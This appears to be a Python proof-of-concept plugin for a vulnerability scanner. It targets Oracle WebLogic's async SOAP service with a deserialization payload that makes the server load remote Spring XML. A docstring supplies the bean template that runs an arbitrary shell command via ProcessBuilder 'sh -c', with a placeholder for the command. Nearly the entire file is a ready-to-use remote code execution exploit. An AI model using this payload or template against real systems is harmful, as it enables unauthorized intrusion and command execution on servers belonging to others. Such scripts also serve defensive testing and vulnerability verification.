#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

'''
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>sh</value>
                <value>-c</value>
                <value><![CDATA[
                执行的命令
                ]]></value>
            </list>
            </constructor-arg>
        </bean>
 </beans>
'''

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEBLOGIC

    async def prove(self):
        if self.base_url:
            poc = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string>
    <void><string>http://www.baidu.com/</string></void>
    </class></java>
    </work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
            '''
            url = self.base_url + '_async/AsyncResponseServiceHttps'
            headers = {"Content-Type": "text/xml"}
            async with ClientSession() as session:
                async with session.post(url=url, headers=headers, data=poc, timeout=8) as res:
                    if res and res.status == 202:
                        yield url
                        return



